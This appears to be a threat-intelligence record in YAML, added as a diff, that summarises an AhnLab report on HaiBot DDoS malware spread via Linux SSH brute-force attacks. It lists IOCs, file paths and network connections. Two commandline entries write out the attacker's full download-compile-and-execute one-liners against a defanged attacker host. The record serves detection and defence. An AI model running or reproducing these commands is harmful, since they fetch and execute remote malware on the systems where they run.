@@ -1,0 +1,40 @@
+description: "AhnLab honeypot logs in Q3 2025 revealed Linux SSH brute\u2011force\
+  \ attacks using the HaiBot malware, which downloads and compiles a C program from\
+  \ api.haitool.xyz before executing it as a DDoS tool."
+attribution: Unknown Vietnamese-speaking threat actor
+malware_families:
+- HaiBot
+- ddos
+TTPs:
+  processes:
+  - build
+  commandline:
+  - '# ( curl -sSL -o build.c hxxp://api.haitool[.]xyz:25614/files?file_name=build.c
+    && gcc -o build build.c -lcurl && chmod +x build && ./build) || (curl -sSL -o
+    build hxxp://api.haitool[.]xyz:25614/files?file_name=build && chmod +x build &&
+    ./build); sleep 10'
+  - '# sh -c curl -s hxxp://api.haitool[.]xyz:25614/files?file_name=build.c -o build.c
+    2>/dev/null || wget -qO build.c hxxp://api.haitool[.]xyz:25614/files?file_name=build.c
+    && gcc -o build build.c -lcurl 2>/dev/null && chmod +x build && ./build || (curl
+    -s hxxp://api.haitool[.]xyz:25614/files?file_name=build -o build 2>/dev/null ||
+    wget -qO build hxxp://api.haitool[.]xyz:25614/files?file_name=build) && chmod
+    +x build && ./build; sleep 10'
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: build
+    destination: api.haitool.xyz
+    port: 25614
+  file_activity:
+  - /tmp/build.c
+  - /tmp/build
+  persistence: []
+  process_relations: []
+IOCs:
+  domains:
+  - api.haitool.xyz
+reference: https://asec.ahnlab.com/en/90569
+date_of_publication: October 12, 2025
+file_creation_date: October 17, 2025
